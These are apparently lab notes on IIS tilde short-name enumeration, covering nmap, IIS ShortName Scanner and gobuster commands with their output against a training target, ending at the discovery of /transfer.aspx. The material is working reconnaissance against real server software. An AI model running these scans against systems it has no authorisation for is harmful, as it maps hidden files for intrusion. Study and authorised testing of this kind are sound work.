# IIS Tilde Enumeration

IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the 8.3 format) on some versions of Microsoft Internet Information Services (IIS) web servers. 

When a file or folder is created on an IIS server, Windows generates a short file name in the 8.3 format

IIS tilde directory enumeration primarily involves sending HTTP requests to the server with distinct character combinations in the URL to identify valid short file names :
http://example.com/~a
http://example.com/~b
http://example.com/~c
...

http://example.com/~s :
server replies with a 200 OK status code, revealing a directory with a short name beginning with "s"

http://example.com/~se
http://example.com/~sf
http://example.com/~sg
...

For example, if two files named somefile.txt and somefile1.txt exist in the same directory, their 8.3 short file names would be:

somefi~1.txt for somefile.txt
somefi~2.txt for somefile1.txt

## Enumeration

### nmap for IIS and its version

nmap -p- -sV -sC --open 10.129.224.91

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

--> IIS 7.5 is running on port 80. Executing a tilde enumeration attack on this version could be a viable option.

### Tilde Enumeration using IIS ShortName Scanner

java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP

### Generate Wordlist

egrep -r ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt

### Gobuster Enumeration

gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

===============================================================
2023/03/23 15:14:05 Starting gobuster in directory enumeration mode
===============================================================
/transf**.aspx        (Status: 200) [Size: 941]
Progress: 306 / 309 (99.03%)
===============================================================
2023/03/23 15:14:11 Finished
===============================================================

## LAB

nmap -p- -sV -sC --open 10.129.165.164

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

git clone https://github.com/irsdl/IIS-ShortName-Scanner

java -jar iis_shortname_scanner.jar 0 5 http://10.129.165.164/

egrep -r ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
gobuster dir -u http://10.129.165.164/ -w /tmp/list.txt -x .aspx,.asp

/transfer.aspx        (Status: 200) [Size: 941]
